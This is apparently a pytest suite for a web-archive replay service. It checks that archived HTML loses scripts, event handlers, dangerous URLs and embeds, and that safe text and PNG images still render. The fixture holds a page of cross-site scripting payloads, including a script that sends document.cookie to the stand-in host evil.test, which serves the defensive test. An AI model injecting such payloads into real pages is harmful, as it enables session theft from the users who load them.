"""Malicious archived HTML: tag/attribute whitelist and rewrite safety."""

import re

import pytest

from tests.warcfactory import html_record, png_record, uuid, PNG_1X1

pytestmark = pytest.mark.asyncio

EVIL = """<!DOCTYPE html>
<html><head><base href="https://evil.test/">
<style>body{background:url(//evil.test/track.png)}</style>
<link rel="stylesheet" href="https://evil.test/x.css">
<meta http-equiv="refresh" content="0;url=https://evil.test/">
<script src="https://evil.test/x.js"></script>
<script>fetch('https://evil.test/steal?c='+document.cookie)</script>
</head>
<body onload="alert(1)" onmouseover="alert(2)">
<h1 oncopy="alert(3)">Safe title</h1>
<a href="javascript:alert(1)" onclick="alert(4)" id="x" style="color:red">JS 链接</a>
<a href="https://evil.test/ok" target="_blank" rel="opener">外站链接</a>
<img src=x onerror="alert(5)" srcset="https://evil.test/a.png 1x"
     onload="alert(6)" data-x="1" width="abc">
<svg onload="alert(7)"><script>alert(8)</script></svg>
<iframe src="https://evil.test/frame"></iframe>
<object data="https://evil.test/o"></object>
<embed src="https://evil.test/e">
<form action="https://evil.test/login"><input name="p"><button>go</button></form>
<div style="position:fixed;top:0;left:0;width:100%;height:100%">
  <table><tr><td colspan="2" onclick="alert(9)">普通表格文字</td></tr></table>
</div>
<p>段落 &amp; 文本保留。<b>粗体</b></p>
<!-- secret comment -->
<a href="data:text/html,<script>alert(10)</script>">data 链接</a>
<img src="vbscript:msgbox(1)">
</body></html>"""


async def test_malicious_html_stripped(client):
    uri = "https://example.test/evil"
    r = await client.post(
        "/api/import",
        content=html_record(uuid(1), uri, "2026-09-01T08:00:00Z", EVIL),
        headers={"content-type": "application/warc"},
    )
    assert r.status_code == 200, r.text

    out = (await client.get("/replay", params={
        "at": "2026-09-02T00:00:00Z", "uri": uri})).text

    # All execution/embedding vectors gone.  (The service may inject its
    # own benign <meta charset>/provenance; the archived malicious tags and
    # vectors must not survive.)
    assert 'http-equiv="refresh"' not in out.lower()
    for needle in ("<script", "<iframe", "<object", "<embed", "<form",
                   "<style", "<link", "<svg", "<base",
                   "javascript:", "vbscript:", "data:text/html",
                   "onerror", "onload", "onclick", "onmouseover", "oncopy",
                   "srcset", "evil.test", "alert("):
        assert needle not in out.lower() if needle.islower() else needle not in out, needle
    # Only the injected charset meta is permitted.
    meta_tags = re.findall(r"<meta[^>]*>", out.lower())
    assert meta_tags == ['<meta charset="utf-8">']

    # Safe content survives.
    assert "Safe title" in out
    assert "普通表格文字" in out
    assert "段落 &amp; 文本保留" in out
    assert "<b>粗体</b>" in out
    assert "<table>" in out and "<td" in out and 'colspan="2"' in out
    # Comments removed.
    assert "secret comment" not in out
    # Dangling anchors are inert visible gaps.
    assert "JS 链接" in out
    assert "<span" in out and "archive-gap" in out
    # The broken img (src=x, relative -> missing capture) is a placeholder.
    assert "[archived image missing" in out


async def test_only_png_images_allowed(client):
    uri = "https://example.test/p"
    # A GIF captured (should never be importable), but an image reference
    # pointing to an archived HTML record must render as a gap.
    html = '<html><body><img src="/notpng"></body></html>'
    r = await client.post(
        "/api/import",
        content=html_record(uuid(1), uri, "2026-09-01T08:00:00Z", html)
        + html_record(uuid(2), "https://example.test/notpng",
                      "2026-09-01T08:00:01Z", "<p>html not image</p>"),
        headers={"content-type": "application/warc"},
    )
    assert r.status_code == 200, r.text
    out = (await client.get("/replay", params={
        "at": "2026-09-02T00:00:00Z", "uri": uri})).text
    assert "<img" not in out
    assert "[archived image missing: captured resource is not PNG]" in out


async def test_safe_png_renders(client):
    uri = "https://example.test/good"
    png_uri = "https://example.test/pic.png"
    html = '<html><body><img src="pic.png" alt="ok" width="10" height="10"></body></html>'
    r = await client.post(
        "/api/import",
        content=html_record(uuid(1), uri, "2026-09-01T08:00:00Z", html)
        + png_record(uuid(2), png_uri, "2026-09-01T08:00:01Z", PNG_1X1),
        headers={"content-type": "application/warc"},
    )
    assert r.status_code == 200, r.text
    resp = await client.get("/replay", params={
        "at": "2026-09-02T00:00:00Z", "uri": uri})
    assert '<img ' in resp.text
    assert 'alt="ok"' in resp.text and 'width="10"' in resp.text
    # Rewritten src really serves the archived bytes.  (The markup carries
    # the HTML-entity form &amp;; a browser decodes it on navigation.)
    from html import unescape
    m = re.search(r'src="(/replay[^"]+)"', resp.text)
    img = await client.get(unescape(m.group(1)))
    assert img.status_code == 200
    assert img.headers["content-type"] == "image/png"
    assert img.content == PNG_1X1
